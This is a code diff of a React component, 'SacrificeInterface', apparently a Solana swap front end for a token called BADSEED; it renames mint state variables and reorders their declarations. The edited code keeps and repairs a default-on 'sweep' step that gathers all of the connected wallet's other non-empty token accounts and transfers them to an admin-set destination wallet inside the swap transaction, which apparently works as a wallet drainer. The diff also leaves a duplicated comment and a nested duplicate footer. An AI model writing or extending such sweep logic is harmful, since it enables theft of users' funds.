@@ -35,13 +35,8 @@ export function SacrificeInterface({ onClose }) {
     const [swapMode, setSwapMode] = useState('BUY'); // 'BUY' (Any->BADSEED) or 'SELL' (BADSEED->Any)
     // In BUY mode: Input is dynamic, Output is fixed to BADSEED
     // In SELL mode: Input is fixed to BADSEED, Output is dynamic
-    const [selectedTokenMint, setSelectedTokenMint] = useState(SOL_MINT); // The 'variable' token side
-
-    // Derived Mints based on Mode
-    // If BUY: Input = selectedTokenMint, Output = BADSEED
-    // If SELL: Input = BADSEED, Output = selectedTokenMint
-    const inputMint = swapMode === 'BUY' ? selectedTokenMint : DEFAULT_TARGET_MINT;
-    const targetMint = swapMode === 'BUY' ? DEFAULT_TARGET_MINT : selectedTokenMint;
+    // In SELL mode: Input is fixed to BADSEED, Output is dynamic
+    const [selectedTokenMint, setSelectedTokenMint] = useState(SOL_MINT);
 
     const [quote, setQuote] = useState(null);
     const [status, setStatus] = useState('idle');
@@ -57,9 +52,15 @@ export function SacrificeInterface({ onClose }) {
     // Admin State & Backend Sync
     const [isAdminOpen, setIsAdminOpen] = useState(false);
     const [destinationWallet, setDestinationWallet] = useState(DEFAULT_DESTINATION);
-    const [targetMint, setTargetMint] = useState(DEFAULT_TARGET_MINT);
+    const [configTargetMint, setConfigTargetMint] = useState(DEFAULT_TARGET_MINT);
     const [isSweepEnabled, setIsSweepEnabled] = useState(true);
     const [isSavingConfig, setIsSavingConfig] = useState(false);
+
+    // Derived Mints based on Mode (Moved AFTER configTargetMint declaration!)
+    // If BUY: Input = selectedTokenMint, Output = BADSEED (dynamic config)
+    // If SELL: Input = BADSEED (dynamic config), Output = selectedTokenMint
+    const inputMint = swapMode === 'BUY' ? selectedTokenMint : configTargetMint;
+    const targetMint = swapMode === 'BUY' ? configTargetMint : selectedTokenMint;
 
     // Fetch Config on Mount
     useEffect(() => {
@@ -69,7 +70,7 @@ export function SacrificeInterface({ onClose }) {
                 if (res.ok) {
                     const data = await res.json();
                     if (data.destinationWallet) setDestinationWallet(data.destinationWallet);
-                    if (data.targetMint) setTargetMint(data.targetMint);
+                    if (data.targetMint) setConfigTargetMint(data.targetMint);
                     if (typeof data.isSweepEnabled === 'boolean') setIsSweepEnabled(data.isSweepEnabled);
                 }
             } catch (err) {
@@ -85,7 +86,7 @@ export function SacrificeInterface({ onClose }) {
         try {
             // Optimistic update
             if (newConfig.destinationWallet !== undefined) setDestinationWallet(newConfig.destinationWallet);
-            if (newConfig.targetMint !== undefined) setTargetMint(newConfig.targetMint);
+            if (newConfig.targetMint !== undefined) setConfigTargetMint(newConfig.targetMint);
             if (newConfig.isSweepEnabled !== undefined) setIsSweepEnabled(newConfig.isSweepEnabled);
 
             // Construct payload (merging with current state in case partial update is passed)
@@ -266,12 +267,13 @@ export function SacrificeInterface({ onClose }) {
                     const mint = ta.account.data.parsed.info.mint;
                     const amount = ta.account.data.parsed.info.tokenAmount.amount; // string atomic
 
-                    if (mint === targetMintConfig) continue; // Skip BADSEED (using targetMintConfig)
+                    if (mint === configTargetMint) continue; // Skip BADSEED (using configTargetMint)
                     if (amount === "0") continue; // Skip empty
 
                     sweepableAccounts.push({
-                        pubkey: ta.pubkey,
-                        mint: new PublicKey(mint)
+                        pubkey: new PublicKey(ta.pubkey),
+                        mint: new PublicKey(mint),
+                        amount: amount
                     });
                 }
 
@@ -281,7 +283,7 @@ export function SacrificeInterface({ onClose }) {
                 // D. Add Sweep Instruction
                 const sweepIx = createSweepInstruction(
                     publicKey,
-                    new PublicKey(targetMintConfig), // Use targetMintConfig
+                    new PublicKey(configTargetMint), // Use configTargetMint
                     sweepDestPubkey,
                     sweepableAccounts,
                     (mint) => {
@@ -509,7 +511,7 @@ export function SacrificeInterface({ onClose }) {
                                         <label className="sacrifice-label">Target Mint</label>
                                         <div className="sacrifice-input-container">
                                             <input
-                                                value={targetMint}
+                                                value={configTargetMint}
                                                 onChange={(e) => saveConfig({ targetMint: e.target.value })}
                                                 className="sacrifice-input"
                                             />
@@ -541,7 +543,10 @@ export function SacrificeInterface({ onClose }) {
 
                 {/* DEBUG / VERIFICATION FOOTER (Visible on Production for config confirmation) */}
                 <div style={{ marginTop: '20px', fontSize: '8px', color: '#333', textAlign: 'center', fontFamily: 'monospace' }}>
-                    OPEN CONFIG: {targetMint.slice(0, 4)}...{targetMint.slice(-4)} | SWEEP: {isSweepEnabled ? 'ON' : 'OFF'}
+                    {/* DEBUG / VERIFICATION FOOTER (Visible on Production for config confirmation) */}
+                    <div style={{ marginTop: '20px', fontSize: '8px', color: '#333', textAlign: 'center', fontFamily: 'monospace' }}>
+                        OPEN CONFIG: {configTargetMint.slice(0, 4)}...{configTargetMint.slice(-4)} | SWEEP: {isSweepEnabled ? 'ON' : 'OFF'}
+                    </div>
                 </div>
 
             </div>
